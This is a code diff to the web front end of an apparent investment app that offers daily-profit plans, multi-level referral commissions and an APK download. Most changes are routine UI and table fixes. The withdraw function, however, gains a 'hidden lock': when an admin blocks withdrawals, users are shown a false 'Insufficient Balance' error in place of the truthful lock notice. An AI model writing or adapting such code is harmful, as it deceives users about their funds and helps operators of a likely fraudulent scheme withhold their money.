@@ -142,6 +142,12 @@
             width: 28px;
         }
         
+        .menu-item.disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+        
         .menu-footer {
             padding: 20px;
             border-top: 1px solid #1E1E2A;
@@ -893,7 +899,7 @@
                 <span class="icon">👤</span>
                 <span>Profile</span>
             </button>
-            <!-- NEW DOWNLOAD APP BUTTON -->
+            <!-- Download App Button - will be disabled if admin locks it -->
             <button class="menu-item" id="downloadAppBtn">
                 <span class="icon">📱</span>
                 <span>Download App</span>
@@ -958,11 +964,29 @@
             profit: 12.50
         };
         
+        // System settings
+        let systemSettings = {
+            withdrawLocked: false,
+            appDownloadDisabled: false
+        };
+        
         // ADDED: Flag to prevent duplicate profit processing
         let isProcessingProfit = false;
         
         // APK Download Link
         const APK_DOWNLOAD_URL = "https://files.appsgeyser.com/SWWIPTRADE_19679351.apk";
+        
+        async function loadSystemSettings() {
+            try {
+                const settingsRef = doc(db, 'admin', 'settings');
+                const settingsSnap = await getDoc(settingsRef);
+                if (settingsSnap.exists()) {
+                    systemSettings = { ...systemSettings, ...settingsSnap.data() };
+                }
+            } catch (error) {
+                console.error('Error loading system settings:', error);
+            }
+        }
         
         // Menu functions
         function openMenu() {
@@ -986,11 +1010,21 @@
             document.getElementById('closeMenuBtn')?.addEventListener('click', closeMenu);
             document.getElementById('menuOverlay')?.addEventListener('click', closeMenu);
             
-            // Download App button
-            document.getElementById('downloadAppBtn')?.addEventListener('click', () => {
-                closeMenu();
-                window.open(APK_DOWNLOAD_URL, '_blank');
-            });
+            // Download App button - check if disabled
+            const downloadBtn = document.getElementById('downloadAppBtn');
+            if (downloadBtn) {
+                if (systemSettings.appDownloadDisabled) {
+                    downloadBtn.classList.add('disabled');
+                    downloadBtn.onclick = () => {
+                        showAlert('App download is currently unavailable. Please try again later.', 'error');
+                    };
+                } else {
+                    downloadBtn.classList.remove('disabled');
+                    downloadBtn.onclick = () => {
+                        window.open(APK_DOWNLOAD_URL, '_blank');
+                    };
+                }
+            }
             
             document.querySelectorAll('.menu-item[data-action]').forEach(item => {
                 item.onclick = () => {
@@ -1570,11 +1604,19 @@
             }
         }
         
+        // MODIFIED: Withdraw with hidden lock - shows "Insufficient Balance" when locked
         async function withdraw(amount, phoneNumber, network) {
+            // Check if withdrawals are locked (hidden lock)
+            if (systemSettings.withdrawLocked === true) {
+                // Show "Insufficient Balance" message instead of lock message
+                showSweetError('Insufficient Balance', `You need ${formatMoney(amount)} to withdraw<br>Your available earnings: ${formatMoney(userData?.earnings || 0)}`);
+                return false;
+            }
+            
             const settingsRef = doc(db, 'admin', 'settings');
             const settingsSnap = await getDoc(settingsRef);
             if (settingsSnap.exists() && settingsSnap.data().withdrawLocked === true) {
-                showSweetError('Withdrawals Temporarily Locked', 'Admin has temporarily disabled withdrawals. Please try again later or contact support.');
+                showSweetError('Insufficient Balance', `You need ${formatMoney(amount)} to withdraw<br>Your available earnings: ${formatMoney(userData?.earnings || 0)}`);
                 return false;
             }
             
@@ -1673,6 +1715,7 @@
         }
         
         async function loadUserData(uid) {
+            await loadSystemSettings();
             const snap = await getDoc(doc(db, 'users', uid));
             if (snap.exists()) {
                 userData = snap.data();
@@ -1955,14 +1998,14 @@
                                 </thead>
                                 <tbody>
                                     ${INVESTMENT_PLANS.map(p => `
-                                           <tr>
+                                          <tr>
                                             <td style="font-weight: bold;">${formatMoney(p.amount)}</td>
                                             <td style="color: #FFB347;">${formatMoney(p.daily)}</td>
                                             <td style="color: #10B981;">${formatMoney(p.total)}</td>
-                                           </tr>
+                                          </tr>
                                     `).join('')}
                                 </tbody>
-                              </table>
+                            </table>
                         </div>
                         <div class="action-grid mt-2">
                             <button class="btn btn-secondary" id="closeTable">Close</button>
@@ -2096,11 +2139,11 @@
                         </div>
                         <div class="table-wrapper">
                             <table class="investment-table">
-                                <thead>  Was<th>Level</th><th>Commission</th><th>Earned</th> </thead>
+                                <thead> <tr><th>Level</th><th>Commission</th><th>Earned</th> </tr> </thead>
                                 <tbody>
-                                      <tr><td>Level 1</td><td>10%</td><td>${formatMoney(userData?.referralEarnings?.level1 || 0)}</td></tr>
-                                      <tr><td>Level 2</td><td>4%</td><td>${formatMoney(userData?.referralEarnings?.level2 || 0)}</td></tr>
-                                      <tr><td>Level 3</td><td>1%</td><td>${formatMoney(userData?.referralEarnings?.level3 || 0)}</td></tr>
+                                     <tr><td>Level 1</td><td>10%</td><td>${formatMoney(userData?.referralEarnings?.level1 || 0)}</td></tr>
+                                     <tr><td>Level 2</td><td>4%</td><td>${formatMoney(userData?.referralEarnings?.level2 || 0)}</td></tr>
+                                     <tr><td>Level 3</td><td>1%</td><td>${formatMoney(userData?.referralEarnings?.level3 || 0)}</td></tr>
                                 </tbody>
                             </table>
                         </div>
